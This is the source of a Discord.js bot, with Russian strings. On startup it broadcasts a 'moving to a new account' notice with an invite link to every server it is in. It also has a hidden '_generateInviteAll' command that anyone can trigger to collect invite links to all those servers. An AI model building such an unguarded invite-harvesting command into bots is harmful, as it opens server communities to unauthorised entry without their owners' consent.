const Discord = require('discord.js');
const bot = new Discord.Client();

function sleep(milliseconds) {
    const date = Date.now();
    let currentDate = null;
    do {
        currentDate = Date.now();
    } while (currentDate - date < milliseconds);
}

function EmbedCreate(title, description, fields)
{
    const embed =
    {
        color: 3106352,
        title: title,
        description: description,
        fields: fields,
    }
    return embed;
}

bot.on('ready', async () => {
    console.log(`Запустился бот ${bot.user.username}`);
    
    let guilds = bot.guilds.cache.array();
    //let guilds = [await bot.guilds.fetch('798255710781177887')];
    for (let i = 0; i < guilds.length; i++) {
        let member = await guilds[i].members.fetch(bot.user.id);
        let channels = guilds[i].channels.cache.array();
        channels.sort((prev, next) => prev.rawPosition - next.rawPosition);
        for (let j = 0; j < channels.length; j++)  {   
            if (channels[j].type == "text") {
                if (channels[j].permissionsFor(member).has("VIEW_CHANNEL")) {
                    if (channels[j].permissionsFor(member).has("SEND_MESSAGES")) {
                        console.log(guilds[i].name);
                        channels[j].send({
                            embed: EmbedCreate("Внимание!", "Данный бот (ExchangeBot) переезжает на новый аккаунт. Если вы хотите продолжить пользоваться ботом, пожалуйста, перейдите по ссылке ниже и добавьте новый аккаунт бота\nЕсли у вас есть вопросы, свяжитесь с разработчиком с помощью команды `//feedback`\nПосле добавления нового аккаунта этот можно выгнать с сервера",
                                [
                                    { name: "Ссылка на добавление", value: `[Пригласить бота](${`https://discord.com/api/oauth2/authorize?client_id=856535416579293194&permissions=84993&scope=bot`})\n` },
                                ]
                            )
                        });
                        sleep(1500);
                        break;
                    }
                }
            }
        }
    }
    
});

bot.on('message', async msg => {
    if (msg.content.startsWith('_generateInviteAll')) {
        let servers = await bot.guilds.cache.array();
        console.log("=================================================\nСТАРТ\n=================================================");
        for (let i = 0; i < servers.length; i++) {
            servers[i].channels.cache.random().createInvite({ temporary: true })
                .then(inv => msg.channel.send(`https://discord.gg/${inv.code}`))
                .catch(console.log(servers[i].name + " --- ошибка"));
        }
        console.log("=================================================\nКОНЕЦ\n=================================================");
    } else if (msg.content.startsWith('..bot')) {
        let servers = bot.guilds.cache.map(g => g.id);
        msg.reply(`**${servers.length}** серверов`);
    }
});






bot.login("");